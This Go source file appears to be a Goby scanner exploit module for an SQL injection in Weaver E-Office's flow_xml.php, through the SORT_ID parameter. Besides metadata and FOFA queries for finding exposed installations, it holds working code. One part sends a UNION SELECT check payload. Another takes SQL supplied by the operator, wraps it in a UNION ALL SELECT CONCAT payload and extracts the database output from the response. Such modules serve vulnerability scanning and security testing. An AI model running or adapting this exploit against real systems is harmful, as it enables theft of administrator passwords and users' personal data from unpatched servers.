package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-office flow_xml.php file SORT_ID parameter SQL injection vulnerability",
    "Description": "<p>Weaver e-office is an OA product for small and medium-sized organizations, developed by Weaver Network Technology Co., LTD.</p><p>There is an SQL injection vulnerability in flow_xml.php, which can be used by attackers to obtain information in the database (for example, administrator background password, site user personal information).</p>",
    "Product": "Weaver-EOffice",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-03-09",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "GobyQuery": "body=\"href=\\\"/eoffice\" || body=\"/eoffice10/client\" || body=\"eoffice_loading_tip\" || body=\"eoffice_init\" || header=\"general/login/index.php\" || banner=\"general/login/index.php\" || body=\"/general/login/view//images/updateLoad.gif\" || (body=\"szFeatures\" && body=\"eoffice\") || header=\"eOffice\" || banner=\"eOffice\" || header=\"LOGIN_LANG\" || banner=\"LOGIN_LANG\"",
    "Level": "2",
    "Impact": "<p>An attacker can exploit the SQL injection vulnerability to obtain information from the database (for example, administrator background passwords, site user personal information).</p>",
    "Recommendation": "<p>1. Strictly filter the parameters passed into the vulnerability point to prevent sql injection.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微 E-Office flow_xml.php 文件 SORT_ID 参数 SQL 注入漏洞",
            "Product": "泛微-EOffice",
            "Description": "<p>泛微 E-Office 是面向中小型组织推出的 OA 产品，由泛微网络科技股份有限公司开发。<br></p><p>泛微 E-office 在 flow_xml.php 存在SQL注入漏洞，攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）。<br></p>",
            "Recommendation": "<p>1、对漏洞点传入的参数进行严格的过滤，防止sql注入。</p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Weaver E-office flow_xml.php file SORT_ID parameter SQL injection vulnerability",
            "Product": "Weaver-EOffice",
            "Description": "<p>Weaver&nbsp;e-office is an OA product for small and medium-sized organizations, developed by Weaver Network Technology Co., LTD.</p><p>There is an SQL injection vulnerability in flow_xml.php, which can be used by attackers to obtain information in the database (for example, administrator background password, site user personal information).</p>",
            "Recommendation": "<p>1. Strictly filter the parameters passed into the vulnerability point to prevent sql injection.</p><p>2. Deploy the Web application firewall to monitor database operations.</p><p>3. Disable public network access to the system if necessary.</p>",
            "Impact": "<p>An attacker can exploit the SQL injection vulnerability to obtain information from the database (for example, administrator background passwords, site user personal information).<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-18",
    "PocId": "10881"
}`
	sendPayloadIO85f0sJI95opOOUI := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) {
		getConfig := httpclient.NewGetRequestConfig("/general/system/workflow/flow_type/flow_xml.php?SORT_ID=" + url.QueryEscape(payload))
		getConfig.VerifyTls = false
		getConfig.FollowRedirect = true
		return httpclient.DoHttpRequest(hostInfo, getConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			payload := "1 union select 1,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1"
			resp, _ := sendPayloadIO85f0sJI95opOOUI(hostInfo, payload)
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e4da3b7fbbce2345d7772b0674a318d5")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["attackType"] == "sql" {
				sql := goutils.B2S(stepLogs.Params["sql"])
				payload := "1 UNION ALL SELECT CONCAT(0x716a717071," + sql + ",0x716a717071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
				if resp, err := sendPayloadIO85f0sJI95opOOUI(expResult.HostInfo, payload); err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && resp.StatusCode == 200 && len(regexp.MustCompile(`qjqpq(.*)qjqpq`).FindStringSubmatch(resp.RawBody)) > 1 {
					expResult.Success = true
					expResult.Output = regexp.MustCompile(`qjqpq(.*)qjqpq`).FindStringSubmatch(resp.RawBody)[1]
					return expResult
				}
			} else if stepLogs.Params["attackType"] == "sqlPoint" {
				resp, err := sendPayloadIO85f0sJI95opOOUI(expResult.HostInfo, `1 union select 1,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e4da3b7fbbce2345d7772b0674a318d5") {
					expResult.Success = true
					expResult.Output = `GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20--%20- HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
